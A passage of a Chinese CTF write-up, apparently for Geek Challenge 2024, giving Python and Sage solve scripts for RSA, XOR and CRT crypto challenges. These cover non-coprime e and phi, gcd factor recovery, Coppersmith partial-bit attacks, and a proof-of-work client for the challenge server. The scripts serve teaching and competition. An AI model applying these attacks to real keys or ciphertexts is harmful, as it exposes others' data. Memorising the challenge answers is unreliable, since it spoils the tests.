q:0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f e:0xc051 c:0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12p:0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb q:0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509 e:0xd2c2 c:0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e</code></pre><p>它说用轩禹直接解解不出来，注意到题目说注意e和phi，能看出e和phi不互素。<br>然后就发他了个脚本解决（这题不需要考虑t=2时的二次同余）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(msg[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x7A7B8EE72D467EEFE378502CA7804E0B55E0B68987DD7E8C03F7F7F717554183D2A0D99C7B33E8E1A28BE171B77F8974616AC49645D7D5CF6FE5F4DCBFD1D25C3AD75E1EB3E4038D55A29C7114E176FD34626C2A8E76021D079CDB85CC8016ACAB00047910DFA5CD0439A3CC13527557EA879C184454A443711083A4F9D1D46B</span></span><br><span class="line">q = <span class="number">0xC17C7A7FBC5469AF413F79C07CC5B892CFBBAA00950B115E267E83E2669F3F6779C7302ECFC9F850E0E4185892E96D356D65B1D372432C5A3F297CFB8373FE9A090A3F8DADF6EF6F2CA5B5107454EE6B1385D165BB4BB7776CBBCCB8DE1993A5EBB34EE365FF39B9EC9613121BA99D74759E0BF80726805CE03ED7F1E49375F1</span></span><br><span class="line">e = <span class="number">0x10AE</span></span><br><span class="line">c = <span class="number">0x5BE0DF3BB240FFD53F2D914EB79878231821A1DBA5CC491A888C8FD553A905A7F1CEA2750C39EA48AB4175115591310C0F9D63E1AEE9D2480780F3CE4F98C57114CD2901EA6F560E04A0A9CEC157DAC3DEF734FA10AB54C27BF20211CF1F1F6F6AFE5FC9EF5C9AF864F054A5E61C48C6E6DC087CC350008D4232D08B0B5011923F1077EAD75D54A792AA8A51A0B37BFA3FAEF0B9380CFF209C7BF3A20FBBB087CAF177B83C9BF03E965BD7347DD18418F3E50AEF29CC89FA594CCD31B6F63F397EEBA71629FEC2C8699148DFD6BE32DEB96577690814BB4FE6DBEFE2379468E0E317A870795BA04AB2E306FE5340700C415048EFF5909A2453752845572A0931</span></span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p>最后加起来md5就做出来了</p><h2 id="Number-theory">Number theory</h2><p>风二西的题库能找到第一部分</p><p>第二部分有点像2024年强网杯的abpq，但比它简单。<br>wp参考自<br><a href="https://github.com/josephsurin/my-ctf-challenges/blob/509f60c5e57f773fe768f01d573effcf0d5e010b/downunderctf-2023/apbq-rsa-i/solve/solv.py">https://github.com/josephsurin/my-ctf-challenges/blob/509f60c5e57f773fe768f01d573effcf0d5e010b/downunderctf-2023/apbq-rsa-i/solve/solv.py</a><br>一个比赛用一个，爽</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line">h0 = <span class="number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line">n1 = <span class="number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line">q = gcd(<span class="built_in">pow</span>(<span class="number">2024</span>, n1, n1) - h0, n1)</span><br><span class="line">p1 = n1 // q</span><br><span class="line"><span class="keyword">assert</span> p1 * q == n1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p1=&quot;</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p1= 173372720206385834569678471333958784638586614453461924694852799411511525290419983713543942463722586256841515819523624239173976987599088346657357916198852116172460701468448365355983089723151147709153372627090761707327697899769559661187061166392094719933102425550671003720484285964838360777691632929809407043791</span></span><br><span class="line"><span class="string">q= 118874695786116734917065043442458952547874656505388902849583986739750433740760352688054822604427183355141871756128562592954061494068247418404217180198818025424511398092449124305805738302689459754842048957858402877387959339315483803736974651246922275580029822892751678239186974759117933061631242872453942209471</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h1 = a1 * p + b1 * q1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h2 = a2 * p + b2 * q1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n2 = p * q1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">hints = [</span><br><span class="line"></span><br><span class="line">    <span class="number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span>,</span><br><span class="line">    <span class="number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">n2 = <span class="number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line">c = <span class="number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(itertools.product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>))):</span><br><span class="line"></span><br><span class="line">    kp = gcd(a1 * hints[<span class="number">0</span>] - a2 * hints[<span class="number">1</span>], n2)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kp &lt; n2:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;find!&quot;</span>, kp, a1, a2</span><br><span class="line">        )  <span class="comment"># find! 178557871889789476735392773689039729944728430625818764599203953284194468360955366524476361619864195810267037397001299832526726480560276846147351034417947012223276604383027178163281207815083989579760615671067777036793963045167137767877397560786425871554804100602428308050015870442290953340882348809647523234561 8161 4513</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kp % i == <span class="number">0</span>:</span><br><span class="line">        kp //= i</span><br><span class="line"></span><br><span class="line">p = kp</span><br><span class="line">q2 = n2 // p</span><br><span class="line"><span class="keyword">assert</span> p * q2 == n2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line">flag = long_to_bytes(m).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="X0R">X0R</h2><p>问gpt的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">flag_prefix = <span class="string">b&quot;SYC&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1: 将e2转换回e1</span></span><br><span class="line">e1 = e2 ^ f2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2: 将e1转换回enc</span></span><br><span class="line">enc = e1 ^ f1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3: 将enc转换为bytes</span></span><br><span class="line">enc_bytes = long_to_bytes(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤4: 推测key的前四个字节</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(flag_prefix, enc_bytes[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤5: 使用推测的key解出flag</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(</span><br><span class="line">    a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(enc_bytes, key_bytes * (<span class="built_in">len</span>(enc_bytes) // <span class="built_in">len</span>(key_bytes)))</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>自己后来的解法</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">e1 = f2 ^ e2</span><br><span class="line">enc = e1 ^ f1</span><br><span class="line">enc = long_to_bytes(enc)</span><br><span class="line">key = xor(enc, <span class="string">b&quot;SYC&#123;&quot;</span>)[:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(xor(key, enc))</span><br></pre></td></tr></table></figure><h2 id="ncoCRT">ncoCRT</h2><p>gpt*2</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 p 和 c 数组</span></span><br><span class="line">p = [</span><br><span class="line">    <span class="number">1921232050179818686537976490035</span>,</span><br><span class="line">    <span class="number">2050175089402111328155892746480</span>,</span><br><span class="line">    <span class="number">1960810970476421389691930930824</span>,</span><br><span class="line">    <span class="number">1797713136323968089432024221276</span>,</span><br><span class="line">    <span class="number">2326915607951286191807212748022</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">c = [</span><br><span class="line">    <span class="number">1259284928311091851012441581576</span>,</span><br><span class="line">    <span class="number">1501691203352712190922548476321</span>,</span><br><span class="line">    <span class="number">1660842626322200346728249202857</span>,</span><br><span class="line">    <span class="number">657314037433265072289232145909</span>,</span><br><span class="line">    <span class="number">2056630082529583499248887436721</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过中国剩余定理求解 m</span></span><br><span class="line">m, _ = crt(p, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换回字节</span></span><br><span class="line">m_bytes = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉最后 23 个字节</span></span><br><span class="line">flag = m_bytes[:-<span class="number">23</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ezRSA">ezRSA</h2><p>经典的m高位泄露，套脚本</p><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line"></span><br><span class="line">h = <span class="number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span></span><br><span class="line">high_m=(h+<span class="number">2023</span>)//<span class="number">2024</span></span><br><span class="line">n = <span class="number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span></span><br><span class="line">c =<span class="number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span></span><br><span class="line"></span><br><span class="line">phase2(high_m, n, c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="凯撒加密">凯撒加密</h2><p><img src="/img/WP/geek2024/caesar.png" alt=""></p><h2 id="nc">nc</h2><p>gpt*3</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># Server details</span></span><br><span class="line">HOST = <span class="string">&quot;nc1.ctfplus.cn&quot;</span>  <span class="comment"># Replace with the server&#x27;s IP address</span></span><br><span class="line">PORT = <span class="number">17384</span>  <span class="comment"># Replace with the server&#x27;s port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_proof_of_work</span>(<span class="params">suffix, hexdigest</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Solve the Proof of Work challenge by brute-forcing the first 4 characters.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(suffix, hexdigest)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> (</span><br><span class="line">        <span class="string">&quot;&quot;</span>.join(c)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>)</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((x + suffix).encode()).hexdigest() == hexdigest:</span><br><span class="line">            <span class="keyword">return</span> x.encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Connect to the server, solve the Proof of Work, and retrieve the flag.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read Proof of Work challenge</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse the PoW challenge</span></span><br><span class="line">        <span class="comment"># Example: &quot;[+] sha256(XXXX+abcdef) == deadbeef...&quot;</span></span><br><span class="line">        _, rest = data.split(<span class="string">&quot;sha256(XXXX+&quot;</span>)</span><br><span class="line">        proof, hexdigest = rest.split(<span class="string">&quot;) == &quot;</span>)</span><br><span class="line">        hexdigest = hexdigest.strip()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Solve the PoW</span></span><br><span class="line">        prefix = solve_proof_of_work(proof.strip(), hexdigest)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> prefix:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed to solve Proof of Work&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send the PoW solution</span></span><br><span class="line">        s.sendall(prefix + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read the server&#x27;s response</span></span><br><span class="line">        response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;PoW failed.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">        <span class="comment"># Retrieve the flag characters</span></span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):  <span class="comment"># Assuming the flag length is 32</span></span><br><span class="line">            s.sendall(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">            response = s.recv(<span class="number">2048</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(response)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;[+]&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">                flag += response.split(<span class="string">&quot;[+] &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid response:&quot;</span>, response)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Print the complete flag</span></span><br><span class="line">        flag = flag.replace(<span class="string">&quot;[-] &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><h2 id="highlow">highlow</h2><p><a href="https://life-extension.github.io/2020/03/29/Coppersmith%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%B0%8F%E7%BB%93/">https://life-extension.github.io/2020/03/29/Coppersmith攻击方式小结/</a><br>转成p已知高位和低位的攻击</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">&#x27;z&#x27;</span>*<span class="number">44</span></span><br><span class="line">f = <span class="built_in">hex</span>(bytes_to_long(flag.encode()))</span><br><span class="line">pxor = <span class="number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span></span><br><span class="line"><span class="built_in">print</span>(f,<span class="built_in">len</span>(<span class="built_in">str</span>(f[<span class="number">2</span>:])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pxor),<span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(pxor))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;high = &#x27;</span>,<span class="built_in">hex</span>(pxor &amp;<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;low = &#x27;</span>, <span class="built_in">hex</span>(pxor &amp;<span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>))</span><br></pre></td></tr></table></figure><pre><code>high =  0xb0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3ea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000low =  0x496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</code></pre><figure class="highlight py"><figcaption><span>| sage</span></figcaption><table><tr><td class="code"><pre><span class="line">size = <span class="number">2048</span></span><br><span class="line">sizep= <span class="number">1024</span></span><br><span class="line">knownbits= <span class="number">134</span>*<span class="number">4</span></span><br><span class="line">N = <span class="number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#we need to define an polynomial == 0 (mod p) that gives us the missing part (x)</span></span><br><span class="line"><span class="comment"># f_p(x) = x*2**(knownbits/2) + p_msb + p_lsb</span></span><br><span class="line"><span class="comment"># it&#x27;s not monic so we need to divide by 2**(knownbits/2)</span></span><br><span class="line"><span class="comment"># set R = 2**(knownbits/2) and invert it modulo N</span></span><br><span class="line"></span><br><span class="line">R = <span class="number">2</span>**(knownbits//<span class="number">2</span>)<span class="comment">#从第68位开始测试</span></span><br><span class="line">invR = inverse_mod(R,N)</span><br><span class="line"><span class="comment">#补齐两边</span></span><br><span class="line">p_msb = <span class="number">0xb0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3ea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">p_lsb = <span class="number">0x496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</span></span><br><span class="line"><span class="comment">#setup coppersmith</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line"><span class="comment">#define the poly in x modulo p</span></span><br><span class="line">f = x + (p_msb+p_lsb)*invR</span><br><span class="line"><span class="comment">#solve it</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^(sizep-knownbits)-<span class="number">1</span>, beta=<span class="number">0.44</span>, epsilon=<span class="number">1</span>/<span class="number">64</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;reconstructed p: &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(Integer(x0*R)+p_msb+p_lsb))</span><br><span class="line"><span class="comment"># reconstructed p: b0e8877e79882c5a79d179cb1210757cd772be928e737659579dfaf8c5e5ad07e3eaa21526dceb4b5a0150fccdddbc5e88b624e41e9270428bf188d2526ccadabff88ea107fcb6952e937b0d315d0496dcf99798bd0ffe272a7a8b73030ed1510c5970a7084ac319258d90fd5607278fd5ec3784f1e05ed5849ad42df621fe27</span></span><br></pre></td></tr></table></figure><h2 id="RnoCRT">RnoCRT</h2><p>风二西题库又秒了<br>[V&amp;N2020 公开赛]CRT(中国剩余定理模数不互质)<br><a href="https://blog.csdn.net/weixin_44110537/article/details/107396080">https://blog.csdn.net/weixin_44110537/article/details/107396080</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">a1, n1, a2, n2</span>):</span><br><span class="line">    d = math.gcd(n1, n2)</span><br><span class="line">    c = a2 - a1</span><br><span class="line">    <span class="keyword">if</span> c % d != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    c = (c % n2 + n2) % n2</span><br><span class="line">    c = c // d</span><br><span class="line">    n1 = n1 // d</span><br><span class="line">    n2 = n2 // d</span><br><span class="line">    c *= gmpy2.invert(n1, n2)</span><br><span class="line">    c %= n2</span><br><span class="line">    c *= n1 * d</span><br><span class="line">    c += a1</span><br><span class="line">    <span class="keyword">global</span> n3</span><br><span class="line">    <span class="keyword">global</span> a3</span><br><span class="line">    n3 = n1 * n2 * d</span><br><span class="line">    a3 = (c % n3 + n3) % n3</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exCRT</span>(<span class="params">a, n</span>):</span><br><span class="line">    a1 = a[<span class="number">0</span>]</span><br><span class="line">    n1 = n[<span class="number">0</span>]</span><br><span class="line">    le = <span class="built_in">len</span>(a)</span><br><span class="line">    